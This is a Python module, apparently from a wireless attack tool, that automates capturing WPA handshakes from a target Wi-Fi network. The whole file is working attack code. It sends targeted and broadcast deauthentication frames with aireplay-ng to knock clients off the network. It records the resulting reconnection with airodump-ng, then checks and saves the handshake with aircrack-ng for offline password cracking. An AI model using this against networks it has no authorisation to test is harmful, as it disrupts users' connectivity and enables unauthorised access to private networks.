import os
import time
import signal
import subprocess
import threading
import shutil
from datetime import datetime
from utils import colored_log, Colors
from scanner import detect_connected_clients
import sys


def capture_handshake(self, network) -> str | None:
    """Capture handshake from target network with countdown"""
    if not self.monitor_interface:
        colored_log("error", "No monitor mode interface found")
        return None

    # Detect connected clients
    clients = detect_connected_clients(self, network)
    if not clients:
        colored_log(
            "error",
            f"No connected clients detected for {network.essid}. Stopping process.",
        )
        return None

    # Deauthenticate clients
    deauthenticate_clients(self, network, clients)

    # Create capture filename
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    capture_name = f"{network.essid.replace(' ', '_')}_{timestamp}"
    capture_path = os.path.join(self.temp_dir, capture_name)

    colored_log("info", f"Starting handshake capture for {network.essid}...")

    # Start capture process
    capture_cmd = [
        "airodump-ng",
        "--bssid",
        network.bssid,
        "--channel",
        str(network.channel),
        "--write",
        capture_path,
        self.monitor_interface,
    ]

    capture_proc = subprocess.Popen(
        capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    # Start countdown
    cap_file = f"{capture_path}-01.cap"
    timeout = 60  # 1 minute
    start_time = time.time()
    try:
        while True:
            elapsed_time = int(time.time() - start_time)
            remaining_time = max(0, timeout - elapsed_time)
            minutes, seconds = divmod(remaining_time, 60)
            time_str = f"{minutes:02d}:{seconds:02d} remaining"
            sys.stdout.write(
                f"\r{Colors.BLUE}[*] Capturing handshake for {network.essid}: {time_str}{Colors.ENDC}"
            )
            sys.stdout.flush()

            # Check for handshake directly in main thread
            if os.path.exists(cap_file) and _check_handshake(self, cap_file):
                sys.stdout.write(f"\r{' ' * 80}\r")  # Clear line with enough spaces
                sys.stdout.flush()
                colored_log("success", "Handshake detected!")
                break

            if elapsed_time >= timeout:
                sys.stdout.write(f"\r{' ' * 80}\r")  # Clear line with enough spaces
                sys.stdout.flush()
                colored_log("warning", "Handshake capture timed out after 1 minute.")
                break
            time.sleep(1)
    except KeyboardInterrupt:
        sys.stdout.write(f"\r{' ' * 80}\r")  # Clear line with enough spaces
        sys.stdout.flush()
        colored_log("warning", "Capture cancelled by user")
    finally:
        capture_proc.send_signal(signal.SIGTERM)
        capture_proc.wait()

    if not os.path.exists(cap_file) or not _check_handshake(self, cap_file):
        colored_log("error", "Failed to capture handshake after deauthentication.")
        return None

    # Save handshake file
    final_path = os.path.join(
        self.handshake_dir, f"{network.essid.replace(' ', '_')}.cap"
    )
    shutil.copy(cap_file, final_path)
    colored_log("success", f"Handshake saved to {final_path}")
    return final_path


def deauthenticate_clients(self, network, clients: list[str]):
    """Deauthenticate all connected clients using multithreading without waiting"""
    colored_log(
        "info",
        f"Starting deauthentication for {len(clients)} clients on {network.essid}...",
    )

    def deauth_client(client: str):
        deauth_cmd = [
            "aireplay-ng",
            "--deauth",
            "3",
            "-a",
            network.bssid,
            "-c",
            client,
            self.monitor_interface,
        ]
        subprocess.Popen(
            deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

    threads = []
    for client in clients:
        colored_log("info", f"Sending deauth to client {client}...")
        thread = threading.Thread(target=deauth_client, args=(client,))
        thread.daemon = True
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join(timeout=0.5)

    broadcast_deauth_cmd = [
        "aireplay-ng",
        "--deauth",
        "3",
        "-a",
        network.bssid,
        self.monitor_interface,
    ]
    colored_log("info", "Sending broadcast deauthentication...")
    subprocess.Popen(
        broadcast_deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    colored_log(
        "success", "Deauthentication process initiated for all connected clients."
    )


def _check_handshake(self, cap_file: str) -> bool:
    """Check if capture file contains handshake"""
    from utils import execute_command

    if not os.path.exists(cap_file):
        return False

    result = execute_command(["aircrack-ng", cap_file])
    return result and "1 handshake" in result.stdout
